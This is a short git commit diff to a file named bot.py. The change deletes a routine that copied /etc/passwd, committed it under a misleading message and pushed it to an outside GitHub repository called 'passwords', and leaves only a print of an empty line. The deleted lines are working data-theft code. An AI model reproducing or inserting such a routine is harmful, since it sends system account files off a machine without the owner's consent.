d07d72664c2c6e2c2585b80ee6f7677094f71a15
RubenMA12 <158078660+RubenMA12@users.noreply.github.com>
2024-02-10 18:32:55 +0100

    Update bot.py

--- bot.py
+++ bot.py
@@ -2,17 +2,7 @@ import shutil
 from git import Repo
 
 def run():
-    archivo_origen = "/etc/passwd"
-    archivo_destino_local = "passwd.txt"
-    
-    shutil.copy(archivo_origen, archivo_destino_local)
-    
-    repo = Repo.init('.')
-    repo.index.add([archivo_destino_local])
-    repo.index.commit("Copiar archivo /etc/hola")
-    
-    origin = repo.create_remote('origin', url='https://github.com/RubenMA12/passwords.git')
-    origin.push()
+    print("")
 
 if __name__ == "__main__":
     run()
